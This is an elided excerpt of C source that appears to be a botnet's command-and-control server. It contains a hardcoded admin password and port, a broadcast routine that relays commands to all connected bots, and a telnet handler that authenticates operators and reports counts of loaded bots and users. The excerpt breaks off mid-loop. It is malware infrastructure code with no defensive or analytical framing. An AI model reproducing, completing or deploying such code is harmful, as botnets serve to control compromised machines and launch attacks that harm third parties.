...
#define AUTH_PASSWORD "L1ni09jJ0Y"
#define AUTH_PORT 100
...
void broadcast(char *msg, int us) // sends message to all bots, notifies the management clients of this happening
{
        ...
        for(i = 0; i < MAXFDS; i++)
        {
                ...
                {
                        send(i, "\033[1A", 4, MSG_NOSIGNAL);
			send(i, "\r\nUser Said: ", 13, MSG_NOSIGNAL); 
                }
                printf("sent to fd: %d\n", i);
                send(i, msg, strlen(msg), MSG_NOSIGNAL);
                if(sendMGM && managements[i].connected) send(i, "\r\n~$ ", 5, MSG_NOSIGNAL); // send a cool looking prompt to a manager/admin
                else send(i, "\n", 1, MSG_NOSIGNAL);
        }
        free(wot);
}
...
void *telnetWorker(void *sock)
{
        ...
        memset(buf, 0, sizeof buf);
        char cocks[2048];
	memset(cocks, 0, sizeof cocks);
        if(send(thefd, "", 0, MSG_NOSIGNAL) == -1) goto end;        
	if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
        trim(buf);
        if(strcmp(buf, AUTH_PASSWORD) != 0) goto end;
        memset(buf, 0, 2048);
	if(send(thefd, "\033[1A", 4, MSG_NOSIGNAL) == -1) goto end;
	sprintf(cocks, "[ Loaded: %d | Reports: 0 | Users: %d ]\r\n", clientsConnected(), managesConnected);
        if(send(thefd, cocks, strlen(cocks), MSG_NOSIGNAL) == -1) return;
        if(send(thefd, "\r\n~$ ", 5, MSG_NOSIGNAL) == -1) goto end;
        managements[thefd].connected = 1;
        while(fdgets(buf, sizeof buf, thefd) > 0)
        {
		if(strstr(buf, "BOTS")) {
		    sprintf(cocks, "Loaded: %d | Users: %d\r\n", clientsConnected(), managesConnected);
		    if(send(thefd, cocks, strlen(cocks), MSG_NOSIGNAL) == -1) return;
                }
